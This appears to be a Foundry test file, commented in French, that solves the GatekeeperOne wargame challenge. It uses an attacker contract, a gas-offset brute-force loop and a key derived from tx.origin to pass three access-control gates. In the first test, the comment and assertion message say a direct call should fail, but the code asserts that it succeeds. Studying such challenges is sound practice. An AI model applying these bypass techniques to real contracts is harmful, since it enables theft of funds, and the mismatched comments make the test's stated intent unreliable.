// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne} from "../contracts/GatekeepOneOriginal.sol";

// 1️⃣ HARNESS : On expose chaque modifier dans une fonction séparée pour les tester "un par un"
contract GatekeeperOneHarness is GatekeeperOne {
    function passGateOne() public gateOne returns (bool) {
        return true;
    }

    function passGateTwo() public gateTwo returns (bool) {
        return true;
    }

    function passGateThree(
        bytes8 _gateKey
    ) public gateThree(_gateKey) returns (bool) {
        return true;
    }
}

contract Attacker {
    GatekeeperOneHarness target;

    constructor(address _target) {
        target = GatekeeperOneHarness(_target);
    }

    // Appel générique pour n'importe quelle fonction avec un gaz précis
    function attack(
        uint256 totalGas,
        bytes memory data
    ) external returns (bool success, bytes memory returnData) {
        (success, returnData) = address(target).call{gas: totalGas}(data);
    }
}

contract GatekeeperOneTest is Test {
    GatekeeperOneHarness target;
    Attacker attacker;

    function setUp() public {
        target = new GatekeeperOneHarness();
        attacker = new Attacker(address(target));
    }

    // TEST GATE 1 ISOLÉ
    function test_GateOne() public {
        // En direct depuis un EOA simulé (msg.sender == tx.origin) -> Doit échouer
        vm.prank(address(this), tx.origin);

        console.log(" Valeur de tx.origin :", tx.origin);
        console.log(" Valeur de msg.sender :", address(this));
        (bool successDirect, ) = address(target).call(
            abi.encodeWithSignature("passGateOne()")
        );
        assertTrue(successDirect, "Gate 1 doit bloquer les EOA");

        // Via l'Attacker, msg.sender (Attacker) != tx.origin (EOA) -> Doit passer
        (bool successContract, ) = attacker.attack(
            800000,
            abi.encodeWithSignature("passGateOne()")
        );
        assertTrue(
            successContract,
            "Gate 1 doit laisser passer un smart contract"
        );
    }

    // TEST GATE 2 ISOLÉ (On utilise une boucle pour trouver le gaz exact, 100% de réussite garanti)
    function test_GateTwo_FindOffset() public {
        uint256 baseGas = 8191 * 10;
        bool found = false;

        // On boucle sur tous les offsets possibles de 0 à 8190
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = attacker.attack(
                baseGas + i,
                abi.encodeWithSignature("passGateTwo()")
            );
            if (success) {
                console.log("==> BINGO ! OFFSET DE GAZ TROUVE :", i);
                found = true;
                break;
            }
        }
        assertTrue(found, "Offset non trouve");
    }

    // TEST GATE 3 ISOLÉ
    function test_GateThree() public {
        // Clé valide calculée à partir de tx.origin
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;

        (bool success, bytes memory returnData) = attacker.attack(
            800000,
            abi.encodeWithSignature("passGateThree(bytes8)", gateKey)
        );
        if (!success) {
            console.log("echec de Gate 3, donnes de retour :");
            console.log(string(returnData));
        }
        assertTrue(success, "La clef doit passer Gate 3");
    }
}
